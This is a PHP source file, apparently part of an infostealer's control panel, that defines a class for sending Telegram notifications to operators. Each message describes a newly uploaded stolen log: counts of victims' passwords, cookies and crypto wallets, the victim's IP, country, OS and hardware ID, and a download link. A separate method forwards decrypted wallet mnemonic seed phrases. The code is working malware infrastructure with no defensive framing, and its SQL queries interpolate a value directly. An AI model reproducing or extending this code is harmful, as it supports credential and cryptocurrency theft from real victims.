<?php

class TelegramManager
{
    private $connection;

    private $bot_token;
    private $telegram_message;
    private $chat_ids;

    // ---------------------------------------------------------------------------------------
    // __construct
    //
    // class constructor
    // ---------------------------------------------------------------------------------------
    public function __construct($connection)
    {
        $this->connection = $connection;

        $keys = ['telegram_token', 'telegram_message', 'telegram_chat_ids'];
        $placeholders = implode(',', array_fill(0, count($keys), '?'));

        $query = "SELECT setting_key, setting_value FROM settings WHERE setting_key IN ($placeholders)";
        $stmt = $this->connection->prepare($query);

        if (!$stmt) 
        {
            return false;
        }

        $types = str_repeat('s', count($keys));
        $stmt->bind_param($types, ...$keys);

        $stmt->execute();
        $result = $stmt->get_result();

        $settings = [];

        while ($row = $result->fetch_assoc()) 
        {
            $settings[$row['setting_key']] = $row['setting_value'];
        }

        $stmt->close();

        $this->bot_token            = $settings["telegram_token"];
        $this->telegram_message     = base64_decode($settings["telegram_message"]);
        $this->chat_ids             = $settings["telegram_chat_ids"];
    }

    // ---------------------------------------------------------------------------------------
    // SendNotify
    //
    // Send message for uploaded log
    // ---------------------------------------------------------------------------------------
    public function SendNotify($log, $full_upload)
    {
        $build = $log->build;

        $settingsChatIds = [];
        $userChatIds = [];

        $settingsChatIds = array_map('trim', explode(',', $this->chat_ids));

        $query = "SELECT chat_id FROM users WHERE telegram_enable = 1 AND notify_all_logs = 1 AND chat_id != '' AND (builds = '' OR builds = '$build')";
        $result = $this->connection->query($query);

        if ($result) 
        {
            while ($row = $result->fetch_assoc())
            {
                if($row["notify_only_crypto_logs"] == 1)
                {
                    if($log->count_wallets > 0)
                    {
                        $userChatIds[] = $row['chat_id'];
                    }
                }
                else
                {
                    $userChatIds[] = $row['chat_id'];
                }
            }

            $result->free();
        }

        $allChatIds = array_unique(array_merge($settingsChatIds, $userChatIds));

        $message = $this->GenerateMessage($log, $full_upload);

        foreach ($allChatIds as $chatId)
        {
            $result = $this->SendTelegramMessage($chatId, $message);
        }
    }

    // ---------------------------------------------------------------------------------------
    // SendNotifyMnemonic
    //
    // Send message for decoded mnemonic
    // ---------------------------------------------------------------------------------------
    public function SendNotifyMnemonic($log, $wallet, $browser, $profile, $mnemonic)
    {
        $build = $log->build;

        $settingsChatIds = [];
        $userChatIds = [];

        $settingsChatIds = array_map('trim', explode(',', $this->chat_ids));

        $query = "SELECT * FROM users WHERE telegram_enable = 1 AND notify_all_logs = 1 AND chat_id != '' AND (builds = '' OR builds = '$build')";
        $result = $this->connection->query($query);

        if ($result) 
        {
            while ($row = $result->fetch_assoc())
            {
                if($row["notify_only_crypto_logs"] == 1)
                {
                    if($log->count_wallets > 0)
                    {
                        $userChatIds[] = $row['chat_id'];
                    }
                }
                else
                {
                    $userChatIds[] = $row['chat_id'];
                }
            }

            $result->free();
        }

        $allChatIds = array_unique(array_merge($settingsChatIds, $userChatIds));

        $message = $this->GenerateMessageMnemonic($log, $wallet, $browser, $profile, $mnemonic);

        foreach ($allChatIds as $chatId)
        {
            $result = $this->SendTelegramMessage($chatId, $message);
        }
    }

    public function SendTelegramMessage($chat_id, $message)
    {
        $url = "https://api.telegram.org/bot". $this->bot_token ."/sendMessage";
        $postFields = [
            'chat_id' => $chat_id,
            'text'    => $message,
            'parse_mode' => 'HTML',
        ];
        
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result = curl_exec($ch);

        if(curl_errno($ch)) 
        {
            error_log('ERROR cURL: ' . curl_error($ch));
        }

        curl_close($ch);
        return $result;
    }

    private function GenerateMessage($log, $full_upload)
    {
        $array_cookies = preg_split('#\s+#', $log->array_cookies);
        $count_cookies = count($array_cookies);

        // ---------------------------------------------------------------------------------
        $repeated = $log->repeated ? "Yes 🟥" : "No 🟩";

        // ---------------------------------------------------------------------------------
        $wallets_list = '';

        if (!empty($log->array_wallets)) 
        {
            $array_wallets = preg_split('#\s+#', $log->array_wallets);
            $wallets_list = array_unique($array_wallets);
        }

        // ---------------------------------------------------------------------------------
        $download_link = $this->GenerateLogLink($log);

        // ---------------------------------------------------------------------------------
        $markers = '';

        if (!empty($log->log_info["marker"])) 
        {
            $markers = implode(", ", array_keys($log->log_info["marker"]));
        }

        // ---------------------------------------------------------------------------------
        $replacements = array(
            '%ID%'                => $log->log_id,
            '%COUNT_PASSWORDS%'   => $log->count_passwords,
            '%COUNT_COOKIES%'     => $count_cookies,
            '%COUNT_WALLETS%'     => $log->count_wallets,
            '%REPEATED%'          => $repeated,
            '%BUILD%'             => $log->build,
            '%IP%'                => $log->ip,
            '%COUNTRY%'           => $log->iso,
            '%DATE%'              => $log->date,
            '%OS%'                => $log->system,
            '%BIT%'               => $log->architecture,
            '%HWID%'              => $log->hwid,
            '%WALLETS_LIST%'      => $wallets_list,
            '%DOWNLOAD_URL%'      => $download_link,
            '%MARKERS_LIST%'      => $markers,
        );

        return strtr($this->telegram_message, $replacements);
    }

    function GenerateLogLink($log)
    {
        return sprintf(
            '%s/%s/%s',
            rtrim(SERVER_ADDR, '/'),
            trim(LOGS_PATH, '/'),
            $log->filename
        );
    }

    private function GenerateMessageMnemonic($log, $wallet, $browser, $profile, $mnemonic)
    {
        $log_id = $log->log_id;
        $message = "💸💸💸 <b>Decrypted mnemonic!</b>\n\n<b>Log:</b> #log_$log_id\n<b>Plugin</b>: $wallet\n<b>Browser:</b> $browser ($profile)\n\n<pre>$mnemonic</pre>";

        return $message;
    }
}

?>